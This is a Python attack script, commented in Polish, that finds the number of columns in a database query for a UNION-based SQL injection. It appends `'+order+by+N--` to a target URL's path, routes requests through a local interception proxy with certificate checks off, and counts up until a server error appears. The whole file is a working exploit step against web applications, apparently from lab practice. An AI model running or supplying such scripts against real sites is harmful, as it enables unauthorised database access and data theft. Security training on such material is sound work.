


#Ten skrypt bada ilość kolumn do ataku SQLi- do zmiany:............ zmienna = path, zakres kolumn, tj linijka 23,24 




#Union attack
#determin the number of column 


import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies ={'http':'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli_column_number(url):
	path = "....................."
	for i in range(1,50):
		sql_payload = "'+order+by+%s--" %i
		r = requests.get(url+path+sql_payload, verify = False,  proxies = proxies)
		res = r.text
		if "Internal Server Error" in res:
			return i -1
		i = i +1
	return False

if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
	except:
		print("[-] Usage: %s <url>" % sys.argv[0])
		sys.exit(-1)
	print("FIGURE OUT THE NUMBER OF COLUMNS...")
	num_col = exploit_sqli_column_number(url)
	if num_col:
		print("[+]The number of columns is " + str(num_col)+ ".")
	else:
		print("[-]The SQLI  attack was not successful....")


